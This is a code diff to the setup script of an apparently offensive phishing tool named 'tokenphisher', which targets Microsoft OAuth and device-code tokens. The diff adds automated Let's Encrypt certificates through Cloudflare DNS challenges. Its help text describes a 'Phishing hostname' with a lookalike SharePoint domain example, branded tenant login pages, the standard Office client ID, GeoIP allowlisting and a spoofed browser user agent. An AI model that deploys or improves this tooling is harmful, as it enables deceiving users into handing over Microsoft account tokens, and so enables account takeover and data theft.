@@ -3,9 +3,11 @@
 import fs from 'fs';
 import path from 'path';
 import os from 'os';
+import crypto from 'crypto';
 import { execFileSync } from 'child_process';
 import { fileURLToPath } from 'url';
 import { parseArgs } from 'util';
+import acme from 'acme-client';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const ROOT = __dirname;
@@ -51,7 +53,7 @@ const DEFAULT_CONFIG = {
   threemaSecret: 'PutYourSecretHere',
   keyFilePath: '/var/lib/tokenphisher/certs/example.com/privkey.pem',
   certFilePath: '/var/lib/tokenphisher/certs/example.com/cert.pem',
-  caFilePath: '/var/lib/tokenphisher/certs/example.com/origin-ca.pem',
+  caFilePath: '/var/lib/tokenphisher/certs/example.com/chain.pem',
   userAgent:
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
   geoipallowlist: ['CH'],
@@ -63,11 +65,17 @@ function printHelp() {
 Usage:
   node setup.mjs [options]
 
-Required for production TLS (Cloudflare):
-  --domain <hostname>           Phishing hostname / TLS cert name (e.g. share.example.com)
+Required for production TLS:
+  --domain <hostname>           Phishing hostname (e.g. gipi.sharepoint.com.documents.v06.zip)
   --cf-token <token>            Cloudflare API token (or CLOUDFLARE_API_TOKEN env var)
-                                Use the "Create Cloudflare Origin CA certificate" template,
-                                or Account: Cloudflare Origin CA Edit + Zone: SSL/Certificates Edit
+
+TLS options:
+  --tls <mode>                  letsencrypt (default) or cloudflare-origin
+                                letsencrypt: free public cert via DNS challenge — works for deep
+                                subdomains; set Cloudflare DNS to grey cloud (DNS only)
+                                cloudflare-origin: 15-year origin cert; use with orange cloud proxy
+  --acme-staging                Use Let's Encrypt staging (for testing)
+  --renew                       Re-issue cert from existing config.json settings
 
 Microsoft OAuth (auto-configured from OpenID discovery):
   --tenant <domain>             Microsoft tenant domain (e.g. gipi.com). Auto-guessed from
@@ -90,7 +98,13 @@ Common options:
 Examples:
   CLOUDFLARE_API_TOKEN=xxx node setup.mjs \\
     --domain gipi.sharepoint.com.documents.v06.zip \\
-    --tenant gipi.com
+    --tenant gipi.com \\
+    --tls letsencrypt
+
+  CLOUDFLARE_API_TOKEN=xxx node setup.mjs \\
+    --domain share.example.com \\
+    --tenant contoso.com \\
+    --tls cloudflare-origin
 
   node setup.mjs --test-mode --tenant contoso.com
 
@@ -98,6 +112,12 @@ Microsoft setup notes:
   - tokenUrl and deviceCodeUrl are fetched from /.well-known/openid-configuration.
   - clientId uses the standard MS Office public client (not in OpenID discovery).
   - Branded tenant login page is shown when tenant-specific endpoints are used.
+
+TLS notes:
+  - Let's Encrypt (default): token needs Zone → DNS → Edit. DNS record must be grey cloud
+    (DNS only) so browsers see the LE cert directly. Certs renew every ~90 days (npm run renew).
+  - Cloudflare Origin: token needs Origin CA + SSL/Certificates Edit. Works with orange cloud
+    proxy but free edge SSL only covers one subdomain level (share.example.com, not a.b.c.example.com).
 
 Cloudflare setup notes:
   - Domain must already use Cloudflare DNS (orange-cloud proxy recommended).
@@ -120,17 +140,19 @@ function certFilePaths(storeDir) {
   return {
     keyFilePath: path.join(storeDir, 'privkey.pem'),
     certFilePath: path.join(storeDir, 'cert.pem'),
+    chainFilePath: path.join(storeDir, 'chain.pem'),
     caFilePath: path.join(storeDir, 'origin-ca.pem'),
     metaFilePath: path.join(storeDir, 'cert-meta.json'),
+    accountKeyPath: path.join(storeDir, 'acme-account.key'),
   };
 }
 
-function certPathsForConfig(storeDir) {
+function certPathsForConfig(storeDir, provider = 'letsencrypt') {
   const paths = certFilePaths(storeDir);
   return {
     keyFilePath: paths.keyFilePath,
     certFilePath: paths.certFilePath,
-    caFilePath: paths.caFilePath,
+    caFilePath: provider === 'cloudflare-origin' ? paths.caFilePath : paths.chainFilePath,
   };
 }
 
@@ -182,17 +204,161 @@ function migrateLocalCertsIfNeeded(hostname, storeDir) {
   fs.chmodSync(storePaths.keyFilePath, 0o600);
 }
 
-function writeCertMetadata(storeDir, hostname, hostnames, expiresAt) {
+function writeCertMetadata(storeDir, hostname, hostnames, expiresAt, provider) {
   const meta = {
     hostname,
     hostnames,
-    provider: 'cloudflare-origin-ca',
+    provider,
     createdAt: new Date().toISOString(),
     expiresAt: expiresAt.toISOString(),
   };
   fs.writeFileSync(certFilePaths(storeDir).metaFilePath, JSON.stringify(meta, null, 2) + '\n', {
     mode: 0o644,
   });
+}
+
+function sleep(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+function acmeChallengeRecordName(hostname, zoneName) {
+  if (hostname === zoneName) {
+    return '_acme-challenge';
+  }
+  const suffix = `.${zoneName}`;
+  if (hostname.endsWith(suffix)) {
+    return `_acme-challenge.${hostname.slice(0, -suffix.length)}`;
+  }
+  return `_acme-challenge.${hostname}`;
+}
+
+function dns01Digest(keyAuthorization) {
+  return crypto.createHash('sha256').update(keyAuthorization).digest('base64url');
+}
+
+async function createCloudflareTxtRecord(token, zoneId, recordName, content) {
+  return cloudflareRequest(
+    token,
+    'POST',
+    `/zones/${zoneId}/dns_records`,
+    { type: 'TXT', name: recordName, content, ttl: 120 },
+    { step: 'create-dns-txt' }
+  );
+}
+
+async function deleteCloudflareDnsRecord(token, zoneId, recordId) {
+  await cloudflareRequest(
+    token,
+    'DELETE',
+    `/zones/${zoneId}/dns_records/${recordId}`,
+    null,
+    { step: 'delete-dns-txt' }
+  );
+}
+
+async function getOrCreateAcmeAccountKey(storeDir) {
+  const { accountKeyPath } = certFilePaths(storeDir);
+  if (fs.existsSync(accountKeyPath)) {
+    return fs.readFileSync(accountKeyPath);
+  }
+  fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
+  const accountKey = await acme.crypto.createPrivateKey();
+  fs.writeFileSync(accountKeyPath, accountKey, { mode: 0o600 });
+  return accountKey;
+}
+
+function splitCertificateBundle(pemBundle) {
+  const certs = pemBundle.match(/-----BEGIN CERTIFICATE-----[\s\S]*?-----END CERTIFICATE-----/g) ?? [];
+  if (!certs.length) {
+    throw new Error('No certificate found in ACME response');
+  }
+  return { leaf: certs[0], chain: certs.slice(1).join('\n') };
+}
+
+async function provisionLetsEncryptCert(token, hostname, certStoreRoot, forceRenew, acmeStaging) {
+  const storeDir = certStoreDir(certStoreRoot, hostname);
+  migrateLocalCertsIfNeeded(hostname, storeDir);
+
+  const existing = existingCertsAreUsable(storeDir);
+  if (existing && !forceRenew) {
+    console.log(
+      `Reusing existing certificate from ${storeDir} (expires ${existing.expiresAt.toISOString()}, ${existing.daysRemaining} days left)`
+    );
+    return certPathsForConfig(storeDir, 'letsencrypt');
+  }
+
+  if (!token) {
+    throw new Error(
+      `No valid certificate found in ${storeDir}. Provide --cf-token or CLOUDFLARE_API_TOKEN.`
+    );
+  }
+
+  console.log(`Provisioning Let's Encrypt certificate for ${hostname} ...`);
+
+  const { zoneId, zoneName } = await getZoneId(token, hostname);
+  console.log(`Cloudflare zone: ${zoneName} (${zoneId})`);
+  console.log(
+    'Using DNS-01 challenge via Cloudflare. Set your A record to grey cloud (DNS only) so browsers trust the LE cert.'
+  );
+
+  const accountKey = await getOrCreateAcmeAccountKey(storeDir);
+  const [privateKey, csr] = await acme.crypto.createCsr({ commonName: hostname, altNames: [hostname] });
+
+  const challengeRecordName = acmeChallengeRecordName(hostname, zoneName);
+  let challengeRecordId = null;
+
+  try {
+    const certificatePem = await acme.auto({
+      csr,
+      accountKey,
+      email: `admin@${zoneName}`,
+      termsOfServiceAgreed: true,
+      directoryUrl: acmeStaging
+        ? acme.directory.letsencrypt.staging
+        : acme.directory.letsencrypt.production,
+      challengePriority: ['dns-01'],
+      challengeCreateFn: async (_authz, challenge, keyAuthorization) => {
+        if (challenge.type !== 'dns-01') {
+          return;
+        }
+        const txtValue = dns01Digest(keyAuthorization);
+        console.log(`Creating DNS TXT record ${challengeRecordName}.${zoneName} ...`);
+        const record = await createCloudflareTxtRecord(token, zoneId, challengeRecordName, txtValue);
+        challengeRecordId = record.id;
+        console.log('Waiting 20s for DNS propagation ...');
+        await sleep(20000);
+      },
+      challengeRemoveFn: async () => {
+        if (challengeRecordId) {
+          console.log('Removing ACME challenge TXT record ...');
+          await deleteCloudflareDnsRecord(token, zoneId, challengeRecordId);
+          challengeRecordId = null;
+        }
+      },
+    });
+
+    const { leaf, chain } = splitCertificateBundle(certificatePem);
+    fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
+    const paths = certFilePaths(storeDir);
+
+    fs.writeFileSync(paths.keyFilePath, privateKey, { mode: 0o600 });
+    fs.writeFileSync(paths.certFilePath, leaf, { mode: 0o644 });
+    if (chain) {
+      fs.writeFileSync(paths.chainFilePath, chain, { mode: 0o644 });
+    }
+
+    const expiresAt = getCertExpiry(paths.certFilePath);
+    writeCertMetadata(storeDir, hostname, [hostname], expiresAt, 'letsencrypt');
+
+    console.log(`Certificates saved to ${storeDir}/ (valid until ${expiresAt.toISOString()})`);
+    console.log('Renew before expiry with: npm run renew');
+
+    return certPathsForConfig(storeDir, 'letsencrypt');
+  } finally {
+    if (challengeRecordId) {
+      await deleteCloudflareDnsRecord(token, zoneId, challengeRecordId).catch(() => {});
+    }
+  }
 }
 
 function parseGeoip(value) {
@@ -298,9 +464,11 @@ async function cloudflareRequest(token, method, endpoint, body, { step } = {}) {
           'Create a new token in Cloudflare → My Profile → API Tokens:\n' +
           '  • Use the "Create Cloudflare Origin CA certificate" template, OR\n' +
           '  • Custom token with Account → Cloudflare Origin CA → Edit\n' +
-          '    AND Zone → SSL and Certificates → Edit (scoped to v06.zip)\n' +
+          '    AND Zone → SSL and Certificates → Edit (scoped to your zone)\n' +
           'Scope the token to the account/zone that owns your domain.'
-        : '';
+        : step === 'create-dns-txt'
+          ? '\n\nYour token needs Zone → DNS → Edit to complete Let\'s Encrypt DNS validation.'
+          : '';
     throw new Error(`Cloudflare API error (${step ?? endpoint}): ${errors}${hint}`);
   }
   return data.result;
@@ -409,7 +577,7 @@ async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, for
     console.log(
       `Reusing existing certificate from ${storeDir} (expires ${existing.expiresAt.toISOString()}, ${existing.daysRemaining} days left)`
     );
-    return certPathsForConfig(storeDir);
+    return certPathsForConfig(storeDir, 'cloudflare-origin');
   }
 
   if (!token) {
@@ -463,11 +631,11 @@ async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, for
   fs.writeFileSync(paths.caFilePath, await caResponse.text(), { mode: 0o644 });
 
   const expiresAt = getCertExpiry(paths.certFilePath);
-  writeCertMetadata(storeDir, hostname, hostnames, expiresAt);
+  writeCertMetadata(storeDir, hostname, hostnames, expiresAt, 'cloudflare-origin');
 
   console.log(`Certificates saved to ${storeDir}/ (valid until ${expiresAt.toISOString()})`);
 
-  return certPathsForConfig(storeDir);
+  return certPathsForConfig(storeDir, 'cloudflare-origin');
 }
 
 function formatConfigValue(key, value) {
@@ -521,6 +689,9 @@ async function main() {
       'from-config': { type: 'string' },
       'cert-store': { type: 'string' },
       'force-renew': { type: 'boolean', default: false },
+      tls: { type: 'string', default: 'letsencrypt' },
+      'acme-staging': { type: 'boolean', default: false },
+      renew: { type: 'boolean', default: false },
       help: { type: 'boolean', short: 'h', default: false },
     },
     allowPositionals: false,
@@ -547,9 +718,31 @@ async function main() {
   if (values['test-mode']) config.testMode = true;
 
   const cfToken = values['cf-token'] || process.env.CLOUDFLARE_API_TOKEN;
-  const domain = values.domain;
+  let domain = values.domain;
   const tenant = values.tenant;
   const certStoreRoot = path.resolve(values['cert-store'] || DEFAULT_CERT_STORE);
+
+  if (values.renew) {
+    if (!fs.existsSync(CONFIG_JSON)) {
+      console.error('Error: config.json not found. Run setup first.');
+      process.exit(1);
+    }
+    const existingConfig = JSON.parse(fs.readFileSync(CONFIG_JSON, 'utf8'));
+    Object.assign(config, existingConfig);
+    domain = domain || inferHostnameFromConfig(existingConfig, null);
+    values['force-renew'] = true;
+    if (!domain) {
+      console.error('Error: could not determine hostname from config.json.');
+      process.exit(1);
+    }
+    console.log(`Renewing certificate for ${domain} ...`);
+  }
+
+  const tlsMode = values.renew && config.tlsProvider
+    ? config.tlsProvider
+    : values.tls === 'cloudflare-origin'
+      ? 'cloudflare-origin'
+      : 'letsencrypt';
 
   if (tenant || domain) {
     console.log('Discovering Microsoft OAuth endpoints from OpenID configuration ...');
@@ -569,13 +762,19 @@ async function main() {
       process.exit(1);
     }
 
-    const certPaths = await provisionCloudflareOriginCert(
-      cfToken,
-      domain,
-      certStoreRoot,
-      values['force-renew']
-    );
+    const certPaths =
+      tlsMode === 'cloudflare-origin'
+        ? await provisionCloudflareOriginCert(cfToken, domain, certStoreRoot, values['force-renew'])
+        : await provisionLetsEncryptCert(
+            cfToken,
+            domain,
+            certStoreRoot,
+            values['force-renew'],
+            values['acme-staging']
+          );
     Object.assign(config, certPaths);
+    config.tlsProvider = tlsMode;
+    config.tlsHostname = domain;
     config.testMode = false;
   } else if (values['test-mode']) {
     config.testMode = true;
@@ -587,10 +786,28 @@ async function main() {
   console.log('\nSetup complete. Start the server with: npm start');
   if (config.testMode) {
     console.log(`Listening on HTTP port ${config.httpPort}`);
-  } else {
+  } else if (tlsMode === 'cloudflare-origin') {
     console.log(`Listening on HTTPS port ${config.httpsPort}`);
     console.log('Ensure Cloudflare SSL/TLS mode is Full (strict) for origin certificates.');
+  } else {
+    console.log(`Listening on HTTPS port ${config.httpsPort}`);
+    console.log('Ensure the DNS A record is grey cloud (DNS only) for Let\'s Encrypt to work in browsers.');
   }
+}
+
+function inferHostnameFromConfig(config, cliDomain) {
+  if (cliDomain) {
+    return cliDomain;
+  }
+  if (config.tlsHostname) {
+    return config.tlsHostname;
+  }
+  const certPath = config.certFilePath ?? '';
+  const base = path.basename(path.dirname(certPath));
+  if (base && base !== 'certs') {
+    return base;
+  }
+  throw new Error('Could not determine hostname from config');
 }
 
 main().catch((error) => {
